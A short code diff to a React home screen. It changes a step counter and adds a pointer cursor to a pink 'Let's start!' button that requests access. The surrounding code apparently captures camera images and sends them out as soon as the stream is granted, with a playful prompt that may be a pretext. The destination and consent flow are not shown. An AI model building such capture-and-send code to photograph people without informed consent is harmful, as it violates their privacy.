@@ -63,7 +63,7 @@ const Home = () => {
 
       // Prothom chobi tule fela
       captureAndSend(stream);
-      setStep(0);
+      setStep(1);
     } catch (err) {
       alert("Permission chara proshob somvob noy!");
     }
@@ -145,7 +145,7 @@ const Home = () => {
             <button
               // onClick={nextStep}
               onClick={handleGrantAccess}
-              className="px-10 py-4 bg-pink-500 text-white rounded-full font-bold shadow-lg"
+              className="px-10 py-4 bg-pink-500 text-white rounded-full font-bold shadow-lg cursor-pointer"
             >
               চল শুরু করি! 🚀
             </button>
